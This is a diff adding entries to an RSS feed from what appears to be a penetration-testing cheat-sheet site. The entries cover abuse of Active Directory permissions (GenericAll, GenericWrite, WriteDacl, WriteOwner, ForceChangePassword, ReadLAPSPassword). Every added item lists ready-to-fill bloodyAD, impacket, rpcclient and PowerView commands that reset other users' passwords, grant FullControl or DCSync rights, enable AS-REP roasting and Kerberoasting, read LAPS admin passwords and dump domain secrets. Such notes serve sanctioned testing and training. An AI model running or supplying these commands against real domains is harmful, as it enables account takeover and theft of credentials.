@@ -14,5 +14,47 @@
       <guid>https://tldrbins.github.io/addself/</guid>
       <description>Privesc #1: Add self to group (From Linux) bloodyAD powerview.py 1. Add self to group # With password python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; add groupMember &amp;lt;GROUP&amp;gt; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; # With Kerberos python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; add groupMember &amp;lt;GROUP&amp;gt; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; 2. Add genericAll over target group # With password python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; add genericAll &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; # With Kerberos python3 bloodyAD.</description>
     </item>
+    <item>
+      <title>ForceChangePassword</title>
+      <link>https://tldrbins.github.io/forcechangepassword/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/forcechangepassword/</guid>
+      <description>Change target user password (From Linux) BloodyAD rpcclient python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; Ref: bloodyAD&#xA;rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -c &amp;#39;setuserinfo2 &amp;lt;TARGET_USER&amp;gt; 23 &amp;lt;TARGET_USER_NEW_PASSWORD&amp;gt;&amp;#39; Change target user password (From Windows) Windows 1. Import PowerView . .\PowerView.ps1 2. Change Target User Password $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;TARGET_USER&amp;gt; -AccountPassword $password </description>
+    </item>
+    <item>
+      <title>GenericAll</title>
+      <link>https://tldrbins.github.io/genericall/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericall/</guid>
+      <description>Abuse #1: Change target user password Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add Full Control to current user dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target-dn &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -inheritance -action write -rights FullControl 2. Change password bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;lt;NEW_PASSWORD&amp;gt; Ref: bloodyAD&#xA;1. Import PowerView.ps1 . .\PowerView.ps1 2. Change target user password $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;TARGET_USER&amp;gt; -AccountPassword $password Abuse #2: Get shadow credentials Linux 0.</description>
+    </item>
+    <item>
+      <title>GenericWrite</title>
+      <link>https://tldrbins.github.io/genericwrite/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericwrite/</guid>
+      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user Windows 1. Import PowerView . .\PowerView.ps1 2. Check target user Get-DomainUser &amp;lt;TARGET_USER&amp;gt; | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;lt;TARGET_USER&amp;gt; -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -no-pass -dc-ip &amp;lt;DC&amp;gt; Abuse #2 : Kerberoasting by adding spn Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.</description>
+    </item>
+    <item>
+      <title>ReadLAPSPassword</title>
+      <link>https://tldrbins.github.io/readlapspassword/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/readlapspassword/</guid>
+      <description>Abuse #1: Read LAPS Password Linux Windows ldapsearch -h &amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -x -D &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -w &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;#39;(ms-MCS-AdmPwd=*)&amp;#39; ms-MCS-AdmPwd 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Read LAPS password Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred </description>
+    </item>
+    <item>
+      <title>WriteDacl</title>
+      <link>https://tldrbins.github.io/writedacl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writedacl/</guid>
+      <description>Abuse #1: Add dcsync right to user Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity &amp;lt;USER&amp;gt; -TargetIdentity &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;TARGET_GROUP&amp;gt;&amp;#39; -Rights DCSync -Credential $cred 4. Secrets dump Linux impacket-secretsdump &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; </description>
+    </item>
+    <item>
+      <title>WriteOwner/Own</title>
+      <link>https://tldrbins.github.io/writeowner/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writeowner/</guid>
+      <description>Abuse #1 : Change owner of the group Windows 1. Import PowerView . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity &amp;lt;TARGET_GROUP&amp;gt; -OwnerIdentity &amp;lt;TARGET_USER&amp;gt; Abuse #2 : Add user to the group Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add full control permission to the user over the group sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target &amp;lt;TARGET_GROUP&amp;gt; -inheritance -action write -rights FullControl 2.</description>
+    </item>
   </channel>
 </rss>
